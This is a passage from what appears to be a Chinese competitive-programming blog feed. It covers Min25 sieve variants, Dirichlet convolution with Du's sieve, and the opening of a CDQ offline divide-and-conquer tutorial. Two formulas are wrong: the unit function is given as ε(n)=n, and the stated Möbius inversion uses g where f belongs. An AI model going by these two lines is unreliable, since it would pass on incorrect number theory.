<p>接下来就是怎么确定 <span class="math inline">\(m\)</span> 了，不难发现这就是求对于函数 <span class="math inline">\(y(n) = 1\)</span> 的 <span class="math inline">\(s\)</span> 值。因此我们只需要在处理函数 <span class="math inline">\(f\)</span> 时，同时处理函数 <span class="math inline">\(y\)</span>，并且在对函数 <span class="math inline">\(f\)</span> 的 <span class="math inline">\(s\)</span> 进行转移时借助函数 <span class="math inline">\(y\)</span> 转移过来的 <span class="math inline">\(s\)</span> 即可。实现的时候开一个结构体一起搜就好了。</p>
<p>具体的实现可以参考一下 <a href="https://github.com/codgician/Competitive-Programming/blob/master/Jisuanke/A2243/min25_sieve.cpp">我的代码</a>。</p>
</div>
<div id="带条件的前缀和" class="section level2">
<h2>带条件的前缀和？</h2>
<p>这也是我自己 YY 的一种应用，不排除有更优秀的做法。对此我也 YY 了一道题：<a href="https://www.luogu.com.cn/problem/U87962">春燕的板子题</a>（也没有严格验过题，而且由于洛谷私人题库有总时限限制所以可能有点卡常，这只是一个 Proof of concept）。</p>
<p>本质上我就是把洛谷上的模板题拉过来对所求前缀和加了一个限制 <span class="math inline">\(i\)</span> 余数的条件。更正式地表示即给定 <span class="math inline">\(r, d (r &lt; d \le 6)\)</span>，求：</p>
<p><span class="math display">\[
\sum\limits_{i = 0}^{n} \left[ i \equiv r \pmod d \right] \cdot f(i)
\]</span></p>
<p>只需要 DP 时再多一维表示模数为 <span class="math inline">\(r\)</span> 即可。而对于 <span class="math inline">\(s\)</span>，可以对 <span class="math inline">\(r\)</span> 种状态开一个结构体同时转移，这样子复杂度多了一个 <span class="math inline">\(r\)</span> 并解决了问题。当时只是自己写着玩搞了搞，代码就不放了，大家也可以试着自己 YY 一下。</p>
</div>
<div id="前缀积" class="section level2">
<h2>前缀积？</h2>
<p>Min25 筛的思想是否可以应用在非前缀和的地方，比如…… 前缀积？对此我自己 YY 了一道题：<a href="https://www.luogu.com.cn/problem/U87823">春燕的数列</a>（没有严格验过题，只是一个 Proof of concept）。</p>
<p>由乘法原理，题目本质即求解：</p>
<p><span class="math display">\[
\prod\limits_{i = 1}^{n} d(i) \pmod {10^9 + 7}
\]</span></p>
<hr />
<p>首先回顾一下 <span class="math inline">\(d\)</span> 的性质：</p>
<ul>
<li><span class="math inline">\(d(p) = 2\)</span>；</li>
<li><span class="math inline">\(d(p^e) = e + 1\)</span>；</li>
<li><span class="math inline">\(d\)</span> 是积性函数。</li>
</ul>
<p>考虑魔改 <span class="math inline">\(s\)</span> 的转移。我们首先修改一下 <span class="math inline">\(s\)</span> 的定义：</p>
<p><span class="math display">\[
s(n, j) = \prod\limits_{i = 2}^{n} \left[ minp(i) \ge P_j \right] d(i)
\]</span></p>
<p>依然把它拆成素数和非素数部分考虑：</p>
<p><span class="math display">\[
s(n, j) = \prod\limits_{i = P_j + 1}^{n} \left[ i \in P \right]d(i) \cdot \prod\limits_{i = P_j + 1}^{n} \left[i \not \in P \right] d(i) 
\]</span></p>
<p>对于第一部分，由于 <span class="math inline">\(d(p) = 2\)</span>，因此第一部分就是 <span class="math inline">\(2^{m}\)</span>，其中 <span class="math inline">\(m\)</span> 为对应区间中质数个数。因此我们依然没有必要魔改 <span class="math inline">\(g\)</span>，只需要通过 <span class="math inline">\(g\)</span> 筛出质数个数即可。</p>
<p>对于第二部分，需要解决的变成了由 <span class="math inline">\(\prod\limits_{p^e \perp k} f(k)\)</span> 快速得出 <span class="math inline">\(\prod\limits_{p^e \perp k} f(p^e \cdot k)\)</span> 的问题。有：</p>
<p><span class="math display">\[
\begin{aligned}
\prod\limits_{p^e \perp k} f(p^e \cdot k) 
&amp; = \prod\limits_{p^e \perp k} \left[ f(p^e) \cdot f(k) \right] \\
&amp; = f(p^e)^m \prod\limits_{p^e \perp k} f(k)
\end{aligned}
\]</span></p>
<p>对于 <span class="math inline">\(m\)</span> 则与前例相同，同时筛一下 <span class="math inline">\(y(n) = 1\)</span> 的 <span class="math inline">\(s\)</span> 值即可。</p>
</div>
</div>
<div id="小结" class="section level1">
<h1>小结</h1>
<p>Min25 筛是一个非常精妙并且灵活多变的 DP。自己在学习的时候就感觉它很精妙，因此就思考了它能否应用在更多的场景，也就 YY 出了后几种粗浅的应用。大概就当是抛砖引玉一下吧，感觉可能还会有更加有趣的变形，欢迎大家一起讨论鸭~</p>
</div>
]]></content>
		</item>
		
		<item>
			<title>数论函数与狄利克雷卷积</title>
			<link>https://codgician.me/zh-hans/posts/2019/08/arithmetic-function-and-dirichlet-convolution/</link>
			<pubDate>Tue, 06 Aug 2019 13:18:39 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2019/08/arithmetic-function-and-dirichlet-convolution/</guid>
			<description>简介 狄利克雷卷积 定义 构造一个环 有趣的性质 再谈莫比乌斯反演？ 杜教筛 构造？ 应用 %%% 简介 本文先从狄利克雷卷积讲起，然后会简要介绍一种基于这一理论的有</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#简介">简介</a></li>
<li><a href="#狄利克雷卷积">狄利克雷卷积</a>
<ul>
<li><a href="#定义">定义</a></li>
<li><a href="#构造一个环">构造一个环</a></li>
<li><a href="#有趣的性质">有趣的性质</a></li>
<li><a href="#再谈莫比乌斯反演">再谈莫比乌斯反演？</a></li>
</ul></li>
<li><a href="#杜教筛">杜教筛</a>
<ul>
<li><a href="#构造">构造？</a></li>
<li><a href="#应用">应用</a></li>
</ul></li>
<li><a href="#section">%%%</a></li>
</ul>
</div>

<div id="简介" class="section level1">
<h1>简介</h1>
<p>本文先从狄利克雷卷积讲起，然后会简要介绍一种基于这一理论的有趣数论函数前缀和筛法（江湖人称 “杜教筛”）。</p>
</div>
<div id="狄利克雷卷积" class="section level1">
<h1>狄利克雷卷积</h1>
<p>前面的博文中我们从初等数论的角度初步领略了莫比乌斯反演，是不是感觉推导有一些小复杂…… 但是，如果我们从抽象代数的角度来对其进行研究，就会发现反演这一公式自然而又优雅。</p>
<div id="定义" class="section level2">
<h2>定义</h2>
<p>我们研究的对象是诸如欧拉函数 <span class="math inline">\(\varphi\)</span>、莫比乌斯函数 <span class="math inline">\(\mu\)</span> 等等的<em>数论函数 (arithmetic function)</em>。在此我们不妨把数论函数定义为 <span class="math inline">\(\mathbb{Z}_{+} \longmapsto \mathbb{C}\)</span> 的函数（正整数集合映射至复数集）。</p>
<p><strong>定义</strong>： 对于数论函数 <span class="math inline">\(f, g\)</span>，定义其 <em>狄利克雷卷积 (Dirichlet convolution)</em>：</p>
<p><span class="math display">\[
(f \cdot g)(n) = \sum\limits_{d \mid n} f(d)g(\frac{n}{d})
\]</span></p>
<p>注：后文常把 <span class="math inline">\((f \cdot g)(n)\)</span> 简写为 <span class="math inline">\(f \cdot g\)</span>。</p>
</div>
<div id="构造一个环" class="section level2">
<h2>构造一个环</h2>
<p><strong>定理</strong>：记 <span class="math inline">\(\mathbb{F}\)</span> 为全体数论函数构成的集合，则 <span class="math inline">\(\langle \mathbb{F}, +, \cdot \rangle\)</span> 构成可交换环。其中 <span class="math inline">\(+\)</span> 就是正常的加法，<span class="math inline">\(\cdot\)</span> 则为刚刚提到的卷积（后文中可能会将其称作“乘法”）。</p>
<p><em>证明</em>：</p>
<p>首先我们可以列一个证明清单：</p>
<ol style="list-style-type: decimal">
<li>运算的封闭性；</li>
<li><span class="math inline">\(+\)</span>：交换律、结合律；存在零元（零函数 <span class="math inline">\(0(n) = 0\)</span>，简记为 <span class="math inline">\(0\)</span>）、负元；</li>
<li><span class="math inline">\(\boldsymbol{\cdot}\)</span>：交换律，结合律；存在单位元（元函数 <span class="math inline">\(\epsilon(n) = n\)</span>，简记为 <span class="math inline">\(\epsilon\)</span>）；</li>
<li><span class="math inline">\(+\)</span> 和 <span class="math inline">\(\cdot\)</span> 间满足分配律。</li>
</ol>
<p>第 <span class="math inline">\(1, 2\)</span> 点中的内容较为显然，这里就略去证明了。下面对 <span class="math inline">\(3, 4\)</span> 进行简要证明：</p>
<ul>
<li><p>乘法交换律：</p>
<p><span class="math display">\[
\begin{aligned}
f \cdot g &amp; = \sum\limits_{d | n}f(d)g(\frac{n}{d}) \\
&amp; \text{let } k = \frac{n}{d}, \ \therefore d = \frac{n}{k} \\
&amp; = \sum\limits_{k \mid n}f(\frac{n}{k})g(k) \\
&amp; = g \cdot f
\end{aligned}
\]</span></p></li>
<li><p>乘法结合律：</p>
<p><span class="math display">\[
\begin{aligned}
(f \cdot g) \cdot h &amp; = \sum\limits_{t \mid n}\left[\sum\limits_{d \mid t} f(d)g(\frac{t}{d})\right]h(\frac{n}{t}) \\
&amp; = \sum\limits_{t \mid n}\sum\limits_{d \mid t} f(d)g(\frac{t}{d})h(\frac{n}{t})
\end{aligned}
\]</span></p>
<p><span class="math display">\[
\begin{aligned}
f \cdot (g \cdot h) &amp; = \sum\limits_{d \mid n} f(d) \left[ \sum\limits_{t \mid \frac{n}{d}} g(t)h(\frac{n}{dt}) \right] \\
&amp; \text{let } T = dt \\
&amp; = \sum\limits_{d \mid n} f(d) \left[ \sum\limits_{T \mid n} g(\frac{T}{d})h(\frac{n}{T}) \right] \\
&amp; = \sum\limits_{T \mid n}\sum\limits_{d \mid T} f(d)g(\frac{T}{d})h(\frac{n}{T})
\end{aligned}
\]</span></p>
<p><span class="math display">\[
\therefore (f \cdot g) \cdot h = f \cdot (g \cdot h)
\]</span></p></li>
<li><p>加法和乘法间的分配律（由于已经证明交换律，因此只证左分配律）：</p>
<p><span class="math display">\[
\begin{aligned}
f \cdot (g + h) &amp; = \sum\limits_{d \mid n} f(d) \left[ g(\frac{n}{d}) + h(\frac{n}{d}) \right] \\
&amp; = \sum\limits_{d \mid n} f(d)g(\frac{n}{d}) + f(d)h(\frac{n}{d}) \\
&amp; = f \cdot g + f \cdot h
\end{aligned}
\]</span></p></li>
</ul>
<p>Voilà! 于是我们便得到了一个可交换环。我们来看看用它能够发现哪些有趣的事情~</p>
</div>
<div id="有趣的性质" class="section level2">
<h2>有趣的性质</h2>
<p><strong>定义</strong>：若数论函数 <span class="math inline">\(f\)</span> 满足 <span class="math inline">\(f(1) = 1\)</span>，且 <span class="math inline">\(\forall a,b \ \text{ s.t. } \ a \perp b\)</span>（若 <span class="math inline">\(a, b\)</span> 互质）满足 <span class="math inline">\(f(ab) = f(a)f(b)\)</span>，则称 <span class="math inline">\(f\)</span> 为 <em>积性函数 (multiplicative function)</em>。</p>
<p><strong>定理</strong>：若 <span class="math inline">\(f, g\)</span> 为积性函数，则 <span class="math inline">\(f \cdot g\)</span> 也为积性函数。</p>
<p><em>证明</em>：</p>
<p><span class="math inline">\(\forall a, b \in \mathbb{Z}_{+}, \text{ s.t. } a \perp b\)</span>，有：</p>
<p><span class="math display">\[
\begin{cases}
f(ab) &amp; = f(a)f(b) \\
g(ab) &amp; = g(a)g(b)
\end{cases}
\]</span></p>
<p><span class="math display">\[
\begin{aligned}
(f \cdot g)(a) (f \cdot g)(b) &amp; = \sum\limits_{t_1 \mid a}f(t_1)g(\frac{a}{t_1})\sum\limits_{t_2 \mid b}f(t_2)g(\frac{b}{t_2}) \\
&amp; = \sum\limits_{t_1 \mid a}\sum\limits_{t_2 \mid b}f(t_1)f(t_2)g(\frac{a}{t_1})g(\frac{b}{t_2}) \\
&amp; \because a \perp b, \ \therefore t_1 \perp t_2, \ \frac{a}{t_1} \perp \frac{b}{t_2} \\
&amp; = \sum\limits_{t_1 \mid a}\sum\limits_{t_2 \mid b}f(t_1t_2)g(\frac{ab}{t_1t_2}) \\
&amp; \text {let } d = t_1t_2\\
&amp; = \sum\limits_{d | ab}f(d)g(\frac{ab}{d}) \\
&amp; = (f \cdot g)(ab)
\end{aligned}
\]</span></p>
<p>对最后一步进行一个补充说明，本质上是 <span class="math inline">\(\sum\limits_{t_1 \mid a}\sum\limits_{t_2 \mid b} 1 = \sum\limits_{t | ab}1\)</span>。不妨令 <span class="math inline">\(t_1\)</span> 的质因子集合为 <span class="math inline">\(S_1\)</span>，<span class="math inline">\(t_2\)</span> 的质因子集合为 <span class="math inline">\(S_2\)</span>，则 <span class="math inline">\(\because t_1 \perp t_2, \ \therefore S_1 \cap S_2 = \Phi\)</span>。因此，<span class="math inline">\(\forall t \mid ab\)</span>，一定存在唯一的 <span class="math inline">\(t_1, t_2\)</span> 满足 <span class="math inline">\(t = t_1t_2\)</span> 且 <span class="math inline">\(t_1 \perp t_2\)</span>（可用反证法容易得证）。</p>
</div>
<div id="再谈莫比乌斯反演" class="section level2">
<h2>再谈莫比乌斯反演？</h2>
<p>我们再回过头来看看 <span class="math inline">\(\mu\)</span> 的一个重要性质：</p>
<p><span class="math display">\[
\sum\limits_{d \mid n} \mu(d) =
\begin{cases}
1 &amp; n = 1\\
0 &amp; \text{otherwise} \\
\end{cases}
\]</span></p>
<p>如果我们定义一个数论函数 <span class="math inline">\(1(n) = 1\)</span>，并且简记为 <span class="math inline">\(1\)</span>，那么我们可以将这一性质借助狄利克雷卷积表示为（其中 <span class="math inline">\(\epsilon\)</span> 为我们之前定义的单位元）：</p>
<p><span class="math display">\[
\mu \cdot 1 = \epsilon
\]</span></p>
<p>那么，如果有 <span class="math inline">\(f(n) = \sum\limits_{d \mid n}g(d)\)</span>，即：</p>
<p><span class="math display">\[
\begin{aligned}
f = g \cdot 1 &amp; \Rightarrow f \cdot \mu = g \cdot 1 \cdot \mu \\
&amp; \Rightarrow f \cdot \mu = g \cdot (1 \cdot \mu) \\
&amp; \Rightarrow f \cdot \mu = g \cdot (\mu \cdot 1) \\
&amp; \Rightarrow f \cdot \mu = g \cdot \epsilon \\
&amp; \Rightarrow f \cdot \mu = g 
\end{aligned}
\]</span></p>
<p>于是我们得到了莫比乌斯反演：</p>
<p><span class="math display">\[
g(n) = \sum\limits_{d \mid n}g(d)\mu(\frac{n}{d})
\]</span></p>
<p>在引入了数论函数和卷积构成的代数结构后，这一证明看起来无比简单明了、清新自然~</p>
<hr />
<p>既然提到了莫比乌斯函数 <span class="math inline">\(\mu\)</span>，我们也不能忘了跟他一样经常出现的好基友欧拉函数 <span class="math inline">\(\varphi\)</span>。我们知道欧拉函数有一个性质：</p>
<p><span class="math display">\[
\sum\limits_{d \mid n} \varphi(d) = n
\]</span></p>
<p>我们定义一个数论函数 <span class="math inline">\(N(n) = n\)</span>，并试着将上式表示成狄利克雷卷积？</p>
<p><span class="math display">\[
\varphi \cdot 1 = N
\]</span></p>
<p>我们试着对其操作一下：</p>
<p><span class="math display">\[
\begin{aligned}
\varphi \cdot 1 = N &amp; \Rightarrow \varphi \cdot 1 \cdot \mu = N \cdot \mu \\
&amp; \Rightarrow \varphi = N \cdot \mu
\end{aligned}
\]</span></p>
<p>于是我们再次发现了两者之间非同一般的关系：</p>
<p><span class="math display">\[
\sum\limits_{d \mid n} \frac{\mu(d)}{d} = \frac{\varphi(n)}{n}
\]</span></p>
<hr />
<p>另外，除数函数也可以用狄利克雷卷积表示：</p>
<p><span class="math display">\[
\begin{aligned}
d(n) = \sum\limits_{d \mid n}1 &amp; \Rightarrow d = 1 \cdot 1 \\ 
\sigma(n) = \sum\limits_{d \mid n}d &amp; \Rightarrow \sigma = N \cdot 1
\end{aligned}
\]</span></p>
</div>
</div>
<div id="杜教筛" class="section level1">
<h1>杜教筛</h1>
<p>杜教筛之所以有趣，并不是因为其具有怎样的普适性，而是其本身就在于 “构造”。只要能构造出来，我们就可以对特定的积性函数 <span class="math inline">\(f\)</span> 求出其前缀和 <span class="math inline">\(S(n) = \sum\limits_{i = 1}^{n} f(i)\)</span>。</p>
<div id="构造" class="section level2">
<h2>构造？</h2>
<p>构造两个积性函数 <span class="math inline">\(g, h \ \text{ s.t. } h = f \cdot g\)</span>：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{i = 1}^{n} h(i) &amp; = \sum\limits_{i = 1}^{n} \sum\limits_{d \mid i} f(d)g(\frac{i}{d}) \\
&amp; = \sum\limits_{d = 1}^{n} g(d) \sum\limits_{d \mid i} f(\frac{i}{d}) \\
&amp; = \sum\limits_{d = 1}^{n} g(d) \sum\limits_{i = 1}^{\left\lfloor \frac{n}{d} \right\rfloor} f(i) \\
&amp; = \sum\limits_{d = 1}^{n}g(d) S(\left\lfloor \frac{n}{d} \right\rfloor)
\end{aligned}
\]</span></p>
<p>整理一下可得：</p>
<p><span class="math display">\[
g(1)S(n) = \sum\limits_{i = 1}^{n}h(i) - \sum\limits_{d = 2}^{n} g(d)S(\left\lfloor\frac{n}{d}\right\rfloor)
\]</span></p>
<p>这就是杜教筛的本体。换句话说，只要我们构造出的 <span class="math inline">\(\sum\limits_{i = 1}^{n}h(i)\)</span> 是可以 <span class="math inline">\(\mathcal{O}(1)\)</span> 求得的，那么结合适当的预处理和记忆化（预处理规模 <span class="math inline">\(\mathcal{O}(n ^ \frac{2}{3})\)</span>），我们可以用 <span class="math inline">\(\mathcal{O}(n ^ \frac{2}{3})\)</span> 的复杂度计算出 <span class="math inline">\(S(n)\)</span>。</p>
<p>更具体地说，即我们应当先用线性筛预处理出前 <span class="math inline">\(\mathcal{O}(n ^ \frac{2}{3})\)</span> 左右的前缀和，然后对于大于这一阈值的前缀和递归求解。同时，每当求出一个值我们将其记忆化在哈希表里以加速未来的运算。</p>
<p>对于这一筛法复杂度的详细证明大家可以参考这篇博文：<a href="https://blog.csdn.net/Ike940067893/article/details/84781307">杜教筛时间复杂度证明 - _Ark</a></p>
</div>
<div id="应用" class="section level2">
<h2>应用</h2>
<p>下面我们来看几点应用，感受一下杜教筛的魅力所在~</p>
<ul>
<li><p><span class="math inline">\(f(i) = \varphi(i), \ S(n) = \sum\limits_{i = 1}^{n} \varphi(i)\)</span>：</p>
<p>由 <span class="math inline">\(\varphi \cdot 1 = N\)</span> （对应 <span class="math inline">\(f \cdot g = h\)</span>）：
<span class="math display">\[
S(n) = \sum\limits_{i = 1}^{n}i - \sum\limits_{d = 2}^{n} S(\left\lfloor \frac{n}{d} \right\rfloor)
\]</span></p></li>
<li><p><span class="math inline">\(f(i) = \mu(i), \ S(n) = \sum\limits_{i = 1}^{n} \mu(i)\)</span>：</p>
<p>由 <span class="math inline">\(\mu \cdot 1 = \epsilon\)</span>（对应 <span class="math inline">\(f \cdot g = h\)</span>）：</p>
<p><span class="math display">\[
S(n) = 1 - \sum\limits_{d = 2}^{n} S(\left\lfloor \frac{n}{d} \right\rfloor)
\]</span></p></li>
<li><p><span class="math inline">\(f(i) = i \varphi(i), \ S(n) = \sum\limits_{i = 1}^{n} i \varphi(i)\)</span>：</p>
<p><span class="math display">\[
 \begin{aligned}
 h= f \cdot g &amp; = \sum\limits_{d \mid n}f(d)g(\frac{n }{d}) \\
 &amp; = \sum\limits_{d \mid n} d \varphi(d)g(\frac{n}{d}) \\
 &amp; \text{let } g = N \\ 
 &amp; = n\sum\limits_{d \mid n}\varphi(d) \\
 &amp; = n^2
 \end{aligned}
 \]</span></p>
<p><span class="math display">\[
 S(n) = \sum\limits_{i = 1}^{n}i^2 - \sum\limits_{d = 2}^{n} dS(\left\lfloor \frac{n}{d} \right\rfloor)
 \]</span></p></li>
<li><p><span class="math inline">\(f(i) = i^2 \varphi(i), \ S(n) = \sum\limits_{i = 1}^{n} i^2 \varphi(i)\)</span>：</p>
<p><span class="math display">\[
 \begin{aligned}
 h = f \cdot g &amp; = \sum\limits_{d \mid n} f(d)g(\frac{n}{d}) \\
 &amp; = \sum\limits_{d \mid n}d^2\varphi(d)g(\frac{n}{d}) \\
 &amp; \text{let } g = N^2 \\
 &amp; = n^2\sum\limits_{d \mid n} \varphi(d) \\
 &amp; = n^3
 \end{aligned}
 \]</span></p>
<p><span class="math display">\[
 S(n) = \sum\limits_{i = 1}^{n}i^3 - \sum\limits_{d = 2}^{n}d^2S(\left\lfloor \frac{n}{d} \right\rfloor)
 \]</span></p></li>
</ul>
<p>至于具体的代码，大家可以去试试 <a href="https://www.luogu.com.cn/problem/P4213">洛谷 P4213: 杜教筛 (Sum)</a>，顺便提供 <a href="https://github.com/codgician/Competitive-Programming/blob/master/Luogu/P4213/arithmetic_function.cpp">我的代码</a> 供参考。</p>
<p>完结撒花~</p>
</div>
</div>
<div id="section" class="section level1">
<h1>%%%</h1>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Dirichlet_convolution">Dirichlet convolution - Wikipedia</a></li>
<li><a href="https://hanano-yuuki.github.io/2018/08/14/Dirichlet-convolution">狄利克雷卷积 - Hanano</a></li>
<li><a href="https://www.cnblogs.com/peng-ym/p/9446555.html">杜教筛 - peng_ym</a></li>
<li><a href="https://blog.csdn.net/Ike940067893/article/details/84781307">杜教筛时间复杂度证明 - _Ark</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>浅谈离线分治算法</title>
			<link>https://codgician.me/zh-hans/posts/2019/07/offline-divide-and-conquer/</link>
			<pubDate>Mon, 22 Jul 2019 20:25:56 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2019/07/offline-divide-and-conquer/</guid>
			<description>pre code.sourceCode { white-space: pre; position: relative; } pre code.sourceCode span { display: inline-block; line-height: 1.25; } pre code.sourceCode span:empty { height: 1.2em; } code.sourceCode span { color: inherit; text-decoration: inherit; } div.sourceCode { margin: 1em 0; } pre.sourceCode { margin: 0; } @media screen { div.sourceCode { overflow: auto; } } @media print { pre code.sourceCode { white-space: pre-wrap; } pre code.sourceCode span { text-indent: -5em; padding-left: 5em; }</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>
<style type="text/css">
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  { color: #cccccc; background-color: #303030; }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffcfaf; } /* Alert */
code span.an { color: #7f9f7f; font-weight: bold; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #dca3a3; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #f0dfaf; } /* ControlFlow */
code span.ch { color: #dca3a3; } /* Char */
code span.cn { color: #dca3a3; font-weight: bold; } /* Constant */
code span.co { color: #7f9f7f; } /* Comment */
code span.cv { color: #7f9f7f; font-weight: bold; } /* CommentVar */
code span.do { color: #7f9f7f; } /* Documentation */
code span.dt { color: #dfdfbf; } /* DataType */
code span.dv { color: #dcdccc; } /* DecVal */
code span.er { color: #c3bf9f; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #c0bed1; } /* Float */
code span.fu { color: #efef8f; } /* Function */
code span.im { } /* Import */
code span.in { color: #7f9f7f; font-weight: bold; } /* Information */
code span.kw { color: #f0dfaf; } /* Keyword */
code span.op { color: #f0efd0; } /* Operator */
code span.ot { color: #efef8f; } /* Other */
code span.pp { color: #ffcfaf; font-weight: bold; } /* Preprocessor */
code span.sc { color: #dca3a3; } /* SpecialChar */
code span.ss { color: #cc9393; } /* SpecialString */
code span.st { color: #cc9393; } /* String */
code span.va { } /* Variable */
code span.vs { color: #cc9393; } /* VerbatimString */
code span.wa { color: #7f9f7f; font-weight: bold; } /* Warning */
</style>

<div id="TOC">
<ul>
<li><a href="#简介">简介</a></li>
<li><a href="#分治思想">分治思想</a></li>
<li><a href="#基于时间的离线分治">基于时间的离线分治</a>
<ul>
<li><a href="#cdq-分治">CDQ 分治</a>
<ul>
<li><a href="#从归并排序讲起">从归并排序讲起</a></li>
<li><a href="#偏序问题">偏序问题</a></li>
<li><a href="#动态数据结构问题">动态数据结构问题？</a></li>
<li><a href="#优化动态规划">优化动态规划</a></li>
<li><a href="#小结">小结</a></li>
</ul></li>
<li><a href="#线段树分治">线段树分治</a>
<ul>
<li><a href="#动态二分图判定">动态二分图判定</a></li>
<li><a href="#虚假的强制在线">虚假的强制在线</a></li>
</ul></li>
</ul></li>
<li><a href="#基于数值的离线分治">基于数值的离线分治</a>
<ul>
<li><a href="#整体二分">整体二分</a>
<ul>
<li><a href="#静态区间第-k-小">静态区间第 <span class="math inline">\(k\)</span> 小</a></li>
<li><a href="#动态区间第-k-小">动态区间第 <span class="math inline">\(k\)</span> 小</a></li>
</ul></li>
</ul></li>
<li><a href="#section">%%%</a></li>
</ul>
</div>

<div id="简介" class="section level1">
<h1>简介</h1>
<p>七月在集训队内水了一次讲座，本来打算随便普及一下 CDQ 分治，然后<del>结果发现大家全都会</del>，于是只好稍稍再多研究了一点点，并在这一过程中有了不少感想。虽然之前也写过一篇离线分治的文章，但是反过来看发现当时写的太垃圾了，于是就决定重写一遍，用更合理和更能看见本质的方式来介绍一波离线分治。</p>
<p>另外这里也附上我当时讲座用的 <a href="https://1drv.ms/p/s!AothL07zyekdmbw3p-C5cCTR8596Xw?e=lqfUlG">演示文档</a> （密码：<code>niNT@iqi@nGLe~</code>），不过当时时间紧迫没有仔细验稿，有错恳请指出 QAQ。另外当时因为经验不足，加之下午又刚好被安排了比赛，因此讲的速度可能过快了一点，实在是非常抱歉 QAQ。大家可以通过这篇文章简要地进行复习~</p>
</div>
<div id="分治思想" class="section level1">
<h1>分治思想</h1>
<p>分治算法，即“分而治之”，每次将当前的问题化成两个或更多相同或相似的子问题，再对每个分出的问题进行同样的操作…… 直到子问题足够地小，让我们能够方便地直接求解。归并排序便是分治算法的经典应用之一。</p>
<p>不过，在过去我们遇到的题目中，可能分治思想更多应用在动态规划这一类的题目中。我们来考虑，在允许离线算法的数据结构问题中，是否可以尝试对操作和询问进行分治？</p>
<p>数据结构问题…… 数据结构问题的本质是什么？</p>
<p>数据结构问题往往要求我们维护一系列数据，并对一系列操作依次做出响应。其中，操作往往可以分为以下两种：</p>
<ul>
<li>查询：统计数据信息；</li>
<li>修改：更新数据状态。</li>
</ul>
<p>有了这样的定义后，我们便可以把常见的数据结构问题分为如下两类：</p>
<ul>
<li>静态问题：只有查询，或者所有查询都在所有修改之后进行。</li>
<li>动态问题：所有不是静态问题的数据结构问题 😝。</li>
</ul>
<p>同时，我们也可以把我们用于数据结构的算法分为两类：</p>
<ul>
<li>在线算法：对于每一个查询及时进行响应的算法；</li>
<li>离线算法：预先知道所有操作，集中进行处理后再批量回答查询。</li>
</ul>
<p>比如，常见的线段树就是一个在线算法，因为它能够对每一个询问做出及时的响应；而莫队则是一个离线算法，因为我们必须预先知道完整的操作序列才能够计算答案。</p>
<p>顾名思义，本文所要讲的算法都是离线算法。离线所能带来的好处就是通过增加 <span class="math inline">\(\mathcal{O}(\log{n})\)</span> 的复杂度达到原问题进行简化的目的，或许是把动态问题转换成更加容易处理的静态问题，亦或是把带有插入和删除的操作序列转换成只包含插入操作…… 非常的优雅与简洁，这也是我非常喜欢这一思想的主要原因。</p>
</div>
<div id="基于时间的离线分治" class="section level1">
<h1>基于时间的离线分治</h1>
<div id="cdq-分治" class="section level2">
<h2>CDQ 分治</h2>
<div id="从归并排序讲起" class="section level3">
<h3>从归并排序讲起</h3>
<p><span class="math inline">\(mergesort(l, r)\)</span>：对序列下表区间 <span class="math inline">\([l, r]\)</span> 内元素按值进行排序</p>
<ul>
<li><span class="math inline">\(mid = \frac{1}{2}(l + r)\)</span>；</li>
<li><span class="math inline">\(mergesort(l, mid)\)</span>；</li>
<li><span class="math inline">\(mergesort(mid + 1, r)\)</span>；</li>
<li>双指针合并两个左右有序区间：<span class="math inline">\(merge(l, mid + 1, r + 1)\)</span></li>
</ul>
<p>不难发现，归并排序巧妙地避开了对区间进行排序本身，把问题完全转变为了两个有序区间的合并问题。只要能解决后者，那么前者就解决了。这能不能给我们带来一些启发呢？</p>
</div>
<div id="偏序问题" class="section level3">
<h3>偏序问题</h3>
<p>对于两个 <span class="math inline">\(k\)</span> 元组 <span class="math inline">\(t_1: \langle x_1, x_2, \dots x_k \rangle, \ t_2: \langle y_1, y_2, \dots y_k \rangle\)</span>，如果 <span class="math inline">\(\forall i \in [1, k]\)</span>，满足 <span class="math inline">\(x_i &lt; y_i\)</span>，那么我们称 <span class="math inline">\(\langle t_1, t_2 \rangle\)</span> 构成一组 <span class="math inline">\(k\)</span> 维偏序（有的地方可能会把 <span class="math inline">\(&lt;\)</span> 定义成 <span class="math inline">\(\le\)</span>）。</p>
<div id="三维偏序" class="section level4">
<h4>三维偏序</h4>
<p>我们来考虑这样一个问题：</p>
<p>给定 <span class="math inline">\(n\)</span> 个三元组 <span class="math inline">\(p_i = \langle a_i, b_i, c_i \rangle\)</span>，对于每一个元素 <span class="math inline">\(p_i\)</span>，求满足：<span class="math inline">\(a_i &lt; a_j, b_i &lt; b_j, c_i &lt; c_j\)</span> 的 <span class="math inline">\(\langle i, j \rangle\)</span> 对数。为了方便，我们先考虑不存在 <span class="math inline">\(i, j\)</span> 使得 <span class="math inline">\(a_i = a_j\)</span> 或 <span class="math inline">\(b_i = b_j\)</span> 或 <span class="math inline">\(c_i = c_j\)</span> 的情况。</p>
